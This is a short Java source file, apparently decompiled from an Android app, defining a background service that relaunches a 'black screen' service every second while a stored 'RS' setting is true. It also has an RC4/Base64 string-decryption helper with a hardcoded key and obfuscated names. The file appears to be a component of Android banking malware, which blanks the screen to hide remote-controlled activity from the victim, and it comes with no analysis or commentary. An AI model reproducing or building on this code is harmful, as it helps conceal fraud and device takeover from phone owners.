package com.example.mmm.Service;

import android.app.*;
import com.example.mmm.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;

public class srvIBlackScreen extends IntentService
{
    constants consts;
    utils utl;
    
    public srvIBlackScreen() {
        super("");
        this.consts = new constants();
        this.utl = new utils();
    }
    
    private String decrypt_str(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    protected void onHandleIntent(final Intent \u0131ntent) {
        while (this.utl.SettingsRead((Context)this, "RS").equals("true")) {
            this.startService(new Intent((Context)this, (Class)srvBlackScreen.class));
            utils.chalkTile(1000);
        }
        this.stopSelf();
    }
}
